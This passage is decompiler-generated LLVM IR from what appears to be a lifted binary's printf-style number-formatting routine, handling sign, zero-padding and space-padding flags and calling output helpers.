  store i32 %v0_dbd8, i32* %r3.global-to-local, align 4
  store i32 %v2_dbdc, i32* %r0.global-to-local, align 4
  %v0_dbe0 = load i32, i32* @r5, align 4
  %v6_dbe4 = call i32 @function_11a20(i8* %v5_dbe4, i32 %v0_dbc8, i32 %v0_dbcc, i32 %v0_dbd8, i32 %v0_dbe0)
  store i32 %v6_dbe4, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_dbe4, i32* @r6, align 4
  br i1 %v3_dbf4, label %bb148, label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %bb145
  %v7_dbe4 = inttoptr i32 %v6_dbe4 to i8*
  %v3_dbf8 = load i8, i8* %v7_dbe4, align 1
  %v7_dbfc = icmp eq i8 %v3_dbf8, 45
  %v2_dc04 = or i32 %v0_db68, 2
  %v2_dc04.stack_var_-316.4 = select i1 %v7_dbfc, i32 %v2_dc04, i32 %v0_db68
  store i32 %v2_dc04.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_dbfc, label %.thread18, label %dec_label_pc_dc18

.thread18:                                        ; preds = %dec_label_pc_dbf8
  %v3_dc08 = add i32 %v6_dbe4, 1
  store i32 %v3_dc08, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dbf8
  %v1_dc18 = and i32 %v2_dc04.stack_var_-316.4, 2
  %v2_dc18 = icmp eq i32 %v1_dc18, 0
  br i1 %v2_dc18, label %dec_label_pc_dc24, label %bb146

bb146:                                            ; preds = %dec_label_pc_dc18
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc18
  %v1_dc24 = urem i32 %v2_dc04.stack_var_-316.4, 2
  %v2_dc24 = icmp eq i32 %v1_dc24, 0
  br i1 %v2_dc24, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_dc24
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_dc24, %bb147
  %v0_dc80 = phi i32 [ %v6_dbe4, %bb145 ], [ %v3_dc08, %.thread18 ], [ %v6_dbe4, %dec_label_pc_dc24 ], [ %v6_dbe4, %bb147 ], [ %v6_dbe4, %bb146 ]
  %v0_dc3c = phi i32 [ %v0_db68, %bb145 ], [ %v2_dc04, %.thread18 ], [ %v0_db68, %dec_label_pc_dc24 ], [ %v0_db68, %bb147 ], [ %v0_db68, %bb146 ]
  %v3_dc2c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_dc2c, i32* %r2.global-to-local, align 4
  store i32 %v0_dc3c, i32* %r3.global-to-local, align 4
  %v1_dc34 = icmp slt i32 %v3_dc2c, 0
  br i1 %v1_dc34, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_dc64 = phi i32 [ %v3_dc2c, %bb148 ], [ 1, %bb149 ]
  %v1_dc3c = and i32 %v0_dc3c, 16
  %v2_dc3c = icmp eq i32 %v1_dc3c, 0
  store i32 %v2_de10, i32* %r3.global-to-local, align 4
  %v2_dc44 = sub i32 %v2_de10, %v0_dc80
  %v1_dc48 = add i32 %v2_dc44, 127
  store i32 %v1_dc48, i32* @r5, align 4
  br i1 %v2_dc3c, label %bb157, label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_dc50
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_dc50, %bb151
  br i1 %v7_dc5c, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_dc64, %v1_dc48
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_dc68, label %dec_label_pc_dc70, label %bb157

dec_label_pc_dc70:                                ; preds = %bb155
  %v1_dc70 = inttoptr i32 %v0_dc80 to i8*
  %v2_dc70 = load i8, i8* %v1_dc70, align 1
  %v3_dc70 = zext i8 %v2_dc70 to i32
  store i32 %v3_dc70, i32* %r3.global-to-local, align 4
  %v7_dc74 = icmp eq i8 %v2_dc70, 48
  br i1 %v7_dc74, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_dc70
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_dc70
  %v2_dc7c = add i32 %v2_dc44, 128
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_dcb8 = phi i32 [ %v0_dc64, %bb155 ], [ %v0_dc64, %bb150 ], [ 1, %bb156 ], [ %v2_dc7c, %.thread25 ], [ %v0_dc64, %bb154 ]
  %v1_dc80 = inttoptr i32 %v0_dc80 to i8*
  %v2_dc80 = load i8, i8* %v1_dc80, align 1
  %v3_dc80 = zext i8 %v2_dc80 to i32
  store i32 %v3_dc80, i32* %r3.global-to-local, align 4
  %v7_dc84 = icmp eq i8 %v2_dc80, 48
  br i1 %v7_dc84, label %dec_label_pc_dc8c, label %dec_label_pc_dcb4

dec_label_pc_dc8c:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_dc90 = load i32, i32* @r7, align 4
  %v7_dc94 = icmp slt i32 %v0_dc90, 6
  br i1 %v7_dc94, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_dc8c
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_dc8c, %bb158
  br i1 %v7_dba8, label %.thread26, label %dec_label_pc_dca8

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1624c.346 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_de28

dec_label_pc_dca8:                                ; preds = %bb159
  %v2_dca8 = icmp eq i32 %v5_dcb8, 0
  br i1 %v2_dca8, label %bb160, label %dec_label_pc_dcb4

bb160:                                            ; preds = %dec_label_pc_dca8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_de28

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dca8, %bb157
  %v2_dcb4 = sub i32 %v5_dcb8, %v1_dc48
  %tmp199 = icmp ugt i32 %v5_dcb8, %v1_dc48
  br i1 %tmp199, label %.thread90, label %dec_label_pc_de28

.thread90:                                        ; preds = %dec_label_pc_dcb4
  store i32 %v2_dcb4, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_db38
  br i1 %tmp196, label %dec_label_pc_dd00, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcc4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_dcd8 = load i32, i32* @fp, align 4
  store i32 %v0_dcd8, i32* %r0.global-to-local, align 4
  %v2_dcdc = load i32, i32* %v1_db20, align 4
  %v5_dcdc = load i32, i32* %v4_dcdc, align 4
  store i32 %v5_dcdc, i32* %r2.global-to-local, align 4
  store i32 %v2_dce0, i32* %r3.global-to-local, align 4
  %v6_dce4 = call i32 @function_11b70(i32 %v0_dcd8, i32 %v2_dcdc, i32 %v5_dcdc, i32* nonnull %stack_var_-328, i32 55620)
  store i32 %v6_dce4, i32* %r0.global-to-local, align 4
  %v1_dce8 = icmp slt i32 %v6_dce4, 0
  br i1 %v1_dce8, label %dec_label_pc_df94, label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dccc
  %v2_dcf4 = add i32 %v6_dce4, %stack_var_-336.2
  store i32 %v2_dcf4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_df80

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dcc4
  br i1 %v3_dd04, label %dec_label_pc_dda0, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dd00
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_dd00, label %dec_label_pc_dd18, label %dec_label_pc_dd68

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dd08
  %v2_dd18 = load i32, i32* %v1_db20, align 4
  store i32 %v2_dd18, i32* %r3.global-to-local, align 4
  %v9_dd1c = icmp eq i32 %v2_dd18, 0
  store i32 %v2_dd18, i32* %stack_var_-44, align 4
  br i1 %v9_dd1c, label %dec_label_pc_de30, label %dec_label_pc_dd28

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd18
  %v3_dd28 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_dd28, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v5_dd38 = icmp slt i32 %v3_dd28, -1
  br i1 %v5_dd38, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_dd28
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_dd28, %bb161
  %storemerge193 = phi i32 [ %v3_dd28, %bb161 ], [ -1, %dec_label_pc_dd28 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_dd2c, i32* @r1, align 4
  store i32 %v2_dd40, i32* %r3.global-to-local, align 4
  %v0_dd44 = call i32 @function_11570()
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  %v7_dd48 = icmp eq i32 %v0_dd44, -1
  store i32 %v0_dd44, i32* @r5, align 4
  br i1 %v7_dd48, label %dec_label_pc_df94, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %bb162
  %v0_dd54 = load i32, i32* @sl, align 4
  store i32 %v0_dd54, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_dd54, i32* @r6, align 4
  br label %dec_label_pc_de44

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd08
  store i32 %v2_de10, i32* %r8.global-to-local, align 4
  %v2_dd6c = load i32, i32* %v1_db20, align 4
  store i32 %v2_dd40, i32* %r2.global-to-local, align 4
  store i32 %v2_de10, i32* %r0.global-to-local, align 4
  %v3_dd78 = call i32 @function_11520(i32 %v2_de10, i32 %v2_dd6c, i32 %v2_dd40)
  store i32 %v3_dd78, i32* %r0.global-to-local, align 4
  %v7_dd7c = icmp eq i32 %v3_dd78, -1
  store i32 %v3_dd78, i32* @r5, align 4
  br i1 %v7_dd7c, label %dec_label_pc_df94, label %dec_label_pc_dd88

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dd68
  %v0_dd88 = load i32, i32* @sl, align 4
  store i32 %v0_dd88, i32* @r4, align 4
  store i32 %v2_de10, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_dd98 = trunc i32 %v0_dd88 to i8
  %v2_dd98 = load i32, i32* %r8.global-to-local, align 4
  %v4_dd98 = add i32 %v2_dd98, %v3_dd78
  %v5_dd98 = inttoptr i32 %v4_dd98 to i8*
  store i8 %v1_dd98, i8* %v5_dd98, align 1
  %v0_de48.pre.pre = load i32, i32* @r5, align 4
  %v1_de48.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd00
  br i1 %v3_dda4, label %dec_label_pc_de04, label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda0
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_ddb0 = load i32, i32* %v1_db20, align 4
  br i1 %v7_dda0, label %dec_label_pc_ddb0, label %dec_label_pc_dddc

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dda8
  store i32 %v2_ddb0, i32* @r6, align 4
  %v2_ddb4 = icmp eq i32 %v2_ddb0, 0
  br i1 %v2_ddb4, label %dec_label_pc_de30, label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddb0, %dec_label_pc_de0c
  %v0_ddcc = phi i32 [ %v2_ddb0, %dec_label_pc_ddb0 ], [ %v3_de1c, %dec_label_pc_de0c ]
  %v3_ddbc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_ddbc, i32* %r3.global-to-local, align 4
  %v5_ddc8 = icmp slt i32 %v3_ddbc, -1
  br i1 %v5_ddc8, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_ddbc
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_ddbc, %bb163
  %storemerge194 = phi i32 [ %v3_ddbc, %bb163 ], [ -1, %dec_label_pc_ddbc ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_ddcc, i32* %r0.global-to-local, align 4
  %v1_ddd0 = inttoptr i32 %v0_ddcc to i8*
  %v2_ddd0 = call i32 @function_f288(i8* %v1_ddd0)
  store i32 %v2_ddd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_de38

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dda8
  store i32 %v2_ddb0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_de10, i32* @r6, align 4
  store i32 %v2_ddb0, i32* %stack_var_-180, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_de04:                                ; preds = %dec_label_pc_dda0
  br i1 %v7_de04, label %dec_label_pc_de0c, label %dec_label_pc_df94

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de04
  %v0_de0c = call i32 @function_cec4()
  store i32 %v0_de0c, i32* %r0.global-to-local, align 4
  %v1_de14 = inttoptr i32 %v0_de0c to i32*
  %v2_de14 = load i32, i32* %v1_de14, align 4
  store i32 %v2_de14, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_de1c = call i32 @function_f368(i32 %v2_de14, i32 %v2_de10, i32 128)
  store i32 %v3_de1c, i32* %r0.global-to-local, align 4
  store i32 %v3_de1c, i32* @r6, align 4
  br label %dec_label_pc_ddbc

dec_label_pc_de28:                                ; preds = %dec_label_pc_dcb4, %.thread26, %bb160
  %v0_de48.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_dc48, %dec_label_pc_dcb4 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_de30:                                ; preds = %dec_label_pc_dd18, %dec_label_pc_ddb0
  store i32 ptrtoint ([7 x i8]* @global_var_16254.349 to i32), i32* @r6, align 4
  br label %dec_label_pc_de38

dec_label_pc_de38:                                ; preds = %bb164, %dec_label_pc_de30
  %storemerge = phi i32 [ 6, %dec_label_pc_de30 ], [ %v2_ddd0, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_de44

dec_label_pc_de44thread-pre-split:                ; preds = %.thread90, %dec_label_pc_dddc, %dec_label_pc_de28, %dec_label_pc_dd88
  %v1_de48.pre = phi i32 [ 0, %dec_label_pc_de28 ], [ %v1_de48.pre.pre, %dec_label_pc_dd88 ], [ 0, %dec_label_pc_dddc ], [ %v2_dcb4, %.thread90 ]
  %v0_de48.pre = phi i32 [ %v0_de48.pre81, %dec_label_pc_de28 ], [ %v0_de48.pre.pre, %dec_label_pc_dd88 ], [ 1, %dec_label_pc_dddc ], [ %v1_dc48, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_dc3c, %dec_label_pc_de28 ], [ %v0_db68, %dec_label_pc_dd88 ], [ %v0_db68, %dec_label_pc_dddc ], [ %v0_dc3c, %.thread90 ]
  %v0_de44.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de44thread-pre-split, %dec_label_pc_dd54, %dec_label_pc_de38
  %v1_de84 = phi i32 [ %v1_de48.pre, %dec_label_pc_de44thread-pre-split ], [ %v0_dd54, %dec_label_pc_dd54 ], [ 0, %dec_label_pc_de38 ]
  %v0_de48 = phi i32 [ %v0_de48.pre, %dec_label_pc_de44thread-pre-split ], [ %v0_dd44, %dec_label_pc_dd54 ], [ %storemerge, %dec_label_pc_de38 ]
  %v0_de50 = phi i32 [ %v0_de44.pr, %dec_label_pc_de44thread-pre-split ], [ 11, %dec_label_pc_dd54 ], [ 11, %dec_label_pc_de38 ]
  %v0_de8c = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_de44thread-pre-split ], [ %v0_db68, %dec_label_pc_dd54 ], [ %v0_db68, %dec_label_pc_de38 ]
  %v7_de44 = icmp eq i32 %v0_de50, 11
  %v2_de48 = add i32 %v0_de48, %v1_de84
  br i1 %v7_de44, label %dec_label_pc_de60, label %bb165

bb165:                                            ; preds = %dec_label_pc_de44
  %v7_de58 = icmp sgt i32 %v0_de50, 5
  %. = select i1 %v7_de58, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_de5c = add i32 %., %v2_de48
  br label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de44, %bb165
  %v0_de74 = phi i32 [ %v2_de48, %dec_label_pc_de44 ], [ %v2_de5c, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_de64 = sub i32 %tmp97, %v0_de74
  %v3_de64 = icmp uge i32 %tmp97, %v0_de74
  %v9_de64 = icmp eq i32 %tmp97, %v0_de74
  %v2_de68 = xor i1 %v3_de64, true
  %v3_de68 = or i1 %v9_de64, %v2_de68
  br i1 %v3_de68, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_de60
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_de60, %bb166
  %v2_de6c = xor i1 %v9_de64, true
  %v3_de6c = and i1 %v3_de64, %v2_de6c
  br i1 %v3_de6c, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_de74.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_de64, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_de84 = phi i32 [ %v1_de74.pre, %._crit_edge ], [ %v2_de64, %bb168 ]
  %v2_de74 = add i32 %v0_de74, %stack_var_-336.2
  %v2_de78 = add i32 %v2_de74, %v2_de84
  store i32 %v2_de78, i32* @ip, align 4
  store i32 %v0_de8c, i32* %r3.global-to-local, align 4
  %v0_de80 = load i32, i32* @sb, align 4
  %v7_de80 = icmp eq i32 %v0_de80, 48
  br i1 %v7_de80, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_de84 = add i32 %v2_de84, %v1_de84
  store i32 %v3_de84, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_dea0 = phi i32 [ %v2_de84, %bb169 ], [ 0, %bb170 ]
  %v1_de8c = and i32 %v0_de8c, 8
  store i32 %v1_de8c, i32* @r8, align 4
  %v2_de8c = icmp eq i32 %v1_de8c, 0
  br i1 %v2_de8c, label %dec_label_pc_de98, label %dec_label_pc_deb4

dec_label_pc_de98:                                ; preds = %.thread29
  %v0_de98 = load i32, i32* @fp, align 4
  store i32 %v0_de98, i32* %r0.global-to-local, align 4
  store i32 %v0_dea0, i32* %r2.global-to-local, align 4
  %v4_dea4 = call i32 @function_d8f8(i32 %v0_de98, i8 32, i32 %v0_dea0)
  store i32 %v4_dea4, i32* %r0.global-to-local, align 4
  %v1_dea8 = load i32, i32* @sl, align 4
  %v9_dea8 = icmp eq i32 %v4_dea4, %v1_dea8
  br i1 %v9_dea8, label %dec_label_pc_deb0, label %dec_label_pc_df94

dec_label_pc_deb0:                                ; preds = %dec_label_pc_de98
  %v0_deb0 = load i32, i32* @r8, align 4
  store i32 %v0_deb0, i32* @sl, align 4
  %v0_debc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %.thread29, %dec_label_pc_deb0
  %v0_debc = phi i32 [ %v0_de50, %.thread29 ], [ %v0_debc.pre, %dec_label_pc_deb0 ]
  %v0_deb8 = load i32, i32* @fp, align 4
  %v2_debc = add i32 %v0_debc, ptrtoint (i32* @global_var_1625c.351 to i32)
  store i32 %v2_debc, i32* %r0.global-to-local, align 4
  %v2_dec0 = call i32 @function_ee68(i32 %v2_debc, i32 %v0_deb8)
  %v0_dec4 = load i32, i32* @fp, align 4
  store i32 %v0_dec4, i32* %r0.global-to-local, align 4
  %v0_decc = load i32, i32* @r4, align 4
  store i32 %v0_decc, i32* %r2.global-to-local, align 4
  %v4_ded0 = call i32 @function_d8f8(i32 %v0_dec4, i8 48, i32 %v0_decc)
  store i32 %v4_ded0, i32* %r0.global-to-local, align 4
  %v1_ded4 = load i32, i32* @r4, align 4
  %v9_ded4 = icmp eq i32 %v4_ded0, %v1_ded4
  br i1 %v9_ded4, label %dec_label_pc_dedc, label %dec_label_pc_df94

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deb4
  %v3_dedc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dedc, i32* %r3.global-to-local, align 4
  %v2_dee0 = icmp eq i32 %v3_dedc, 0
  br i1 %v2_dee0, label %dec_label_pc_def0, label %dec_label_pc_df50thread-pre-split

dec_label_pc_def0:                                ; preds = %dec_label_pc_dedc
  %v0_def0 = load i32, i32* @r5, align 4
  %v2_def0 = icmp eq i32 %v0_def0, 0
  br i1 %v2_def0, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_def0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_def0
  %v1_def8 = load i32, i32* @r6, align 4
  store i32 %v1_def8, i32* %r0.global-to-local, align 4
  %v1_df00 = load i32, i32* @fp, align 4
  store i32 %v1_df00, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 57096, i32* @lr, align 4
  %v1_df04 = xor i1 %v2_def0, true
  call void @__pseudo_cond_branch(i1 %v1_df04, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_df08 = load i32, i32* %r0.global-to-local, align 4
  %v1_df08 = load i32, i32* @r5, align 4
  %v9_df08 = icmp eq i32 %v0_df08, %v1_df08
  br i1 %v9_df08, label %dec_label_pc_df68, label %dec_label_pc_df94

dec_label_pc_df14:                                ; preds = %dec_label_pc_df50
  %v2_df14 = icmp ult i32 %v1_df18, 128
  %.v1_df18 = select i1 %v2_df14, i32 %v1_df18, i32 128
  store i32 %.v1_df18, i32* @r2, align 4
  %v0_df20 = call i32 @function_11570()
  store i32 %v0_df20, i32* @r4, align 4
  %v2_df24 = icmp eq i32 %v0_df20, 0
  store i32 %v0_df20, i32* %r3.global-to-local, align 4
  store i32 %v2_de10, i32* %r0.global-to-local, align 4
  %v0_df34 = load i32, i32* @fp, align 4
  store i32 %v0_df34, i32* %r2.global-to-local, align 4
  br i1 %v2_df24, label %dec_label_pc_df44, label %dec_label_pc_df3c

dec_label_pc_df3c:                                ; preds = %dec_label_pc_df14
  %v3_df3c = call i32 @function_11740(i32 %v2_de10, i32 %v0_df20, i32 %v0_df34)
  store i32 %v3_df3c, i32* %r0.global-to-local, align 4
  store i32 %v3_df3c, i32* %r3.global-to-local, align 4
  %v1_df44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %dec_label_pc_df14, %dec_label_pc_df3c
  %v1_df44 = phi i32 [ 0, %dec_label_pc_df14 ], [ %v1_df44.pre, %dec_label_pc_df3c ]
  %v0_df48 = phi i32 [ 0, %dec_label_pc_df14 ], [ %v3_df3c, %dec_label_pc_df3c ]
  %v9_df44 = icmp eq i32 %v0_df48, %v1_df44
  %v1_df48 = load i32, i32* @r5, align 4
  %v2_df48 = sub i32 %v1_df48, %v0_df48
  store i32 %v2_df48, i32* @r5, align 4
  br i1 %v9_df44, label %dec_label_pc_df50, label %dec_label_pc_df94

dec_label_pc_df50thread-pre-split:                ; preds = %dec_label_pc_dedc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_df54.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_df50

dec_label_pc_df50:                                ; preds = %dec_label_pc_df50thread-pre-split, %dec_label_pc_df44
  %v1_df18 = phi i32 [ %v0_df54.pr, %dec_label_pc_df50thread-pre-split ], [ %v2_df48, %dec_label_pc_df44 ]
  store i32 %v2_de10, i32* @r6, align 4
  %v2_df54 = icmp eq i32 %v1_df18, 0
  store i32 %v2_dd2c, i32* @r1, align 4
  store i32 %v2_dd40, i32* %r3.global-to-local, align 4
  store i32 %v2_de10, i32* @r0, align 4
  br i1 %v2_df54, label %dec_label_pc_df68, label %dec_label_pc_df14

dec_label_pc_df68:                                ; preds = %dec_label_pc_df50, %.thread36
  %v0_df68 = load i32, i32* @fp, align 4
  store i32 %v0_df68, i32* %r0.global-to-local, align 4
  %v0_df70 = load i32, i32* @sl, align 4
  store i32 %v0_df70, i32* %r2.global-to-local, align 4
  %v4_df74 = call i32 @function_d8f8(i32 %v0_df68, i8 32, i32 %v0_df70)
  store i32 %v4_df74, i32* %r0.global-to-local, align 4
  %v1_df78 = load i32, i32* @sl, align 4
  %v9_df78 = icmp eq i32 %v4_df74, %v1_df78
  br i1 %v9_df78, label %dec_label_pc_df80, label %dec_label_pc_df94

dec_label_pc_df80:                                ; preds = %dec_label_pc_df68, %dec_label_pc_dcf0, %dec_label_pc_db14
  %stack_var_-316.3 = phi i32 [ %v0_db68, %dec_label_pc_db14 ], [ %v0_de8c, %dec_label_pc_df68 ], [ %v0_db68, %dec_label_pc_dcf0 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_db14 ], [ %v2_de78, %dec_label_pc_df68 ], [ %v2_dcf4, %dec_label_pc_dcf0 ]
  %v3_df80 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_df80, i32* @r4, align 4
  br label %dec_label_pc_df84

dec_label_pc_df84:                                ; preds = %dec_label_pc_da24, %dec_label_pc_df80
  %v0_df84 = phi i32 [ %v0_df84.pre, %dec_label_pc_da24 ], [ %v3_df80, %dec_label_pc_df80 ]
  %v0_db68 = phi i32 [ %tmp100, %dec_label_pc_da24 ], [ %stack_var_-316.3, %dec_label_pc_df80 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_da24 ], [ %stack_var_-336.3, %dec_label_pc_df80 ]
  store i32 %v0_df84, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_da3c.outer

dec_label_pc_da3c.outer:                          ; preds = %dec_label_pc_df8c, %dec_label_pc_df84
  %v5_da68 = phi i32 [ %v1_da98, %dec_label_pc_df8c ], [ %v0_df84, %dec_label_pc_df84 ]
  %v0_da3c49 = phi i32 [ %v1_df8c, %dec_label_pc_df8c ], [ %v0_df84, %dec_label_pc_df84 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_df8c ], [ %stack_var_-336.4, %dec_label_pc_df84 ]
  %v1_da3c180 = inttoptr i32 %v0_da3c49 to i8*
  %v2_da3c181 = load i8, i8* %v1_da3c180, align 1
  %v3_da3c182 = zext i8 %v2_da3c181 to i32
  store i32 %v3_da3c182, i32* %r3.global-to-local, align 4
  %v2_da40183 = icmp eq i8 %v2_da3c181, 0
  br i1 %v2_da40183, label %dec_label_pc_da58, label %bb126

dec_label_pc_df8c:                                ; preds = %dec_label_pc_da98
  %v1_df8c = add i32 %v0_daa0, 2
  store i32 %v1_df8c, i32* @r4, align 4
  br label %dec_label_pc_da3c.outer

dec_label_pc_df94:                                ; preds = %dec_label_pc_de04, %dec_label_pc_df68, %.thread36, %dec_label_pc_deb4, %dec_label_pc_de98, %dec_label_pc_dd68, %bb162, %dec_label_pc_dccc, %bb130, %dec_label_pc_df44
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_df9c

dec_label_pc_df9c:                                ; preds = %dec_label_pc_da8c, %bb, %dec_label_pc_da0c, %dec_label_pc_df94
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_da0c ], [ -1, %dec_label_pc_df94 ], [ %stack_var_-336.2, %dec_label_pc_da8c ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_d9c8, i32* @r5, align 4
  store i32 %v15_d9c8, i32* %r8.global-to-local, align 4
  store i32 %v18_d9c8, i32* @sb, align 4
  store i32 %v21_d9c8, i32* @sl, align 4
  store i32 %v24_d9c8, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_df8c, { 1, 0 }
  uselistorder i8 %v2_da3c181, { 1, 2, 0 }
  uselistorder i32 %v0_da3c49, { 2, 0, 1 }
  uselistorder i32 %v5_da68, { 2, 3, 1, 0 }
  uselistorder i32 %v0_db68, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_df84, { 1, 0, 2 }
  uselistorder i32 %v1_df18, { 2, 1, 0 }
  uselistorder i32 %v0_df20, { 1, 0, 2, 3 }
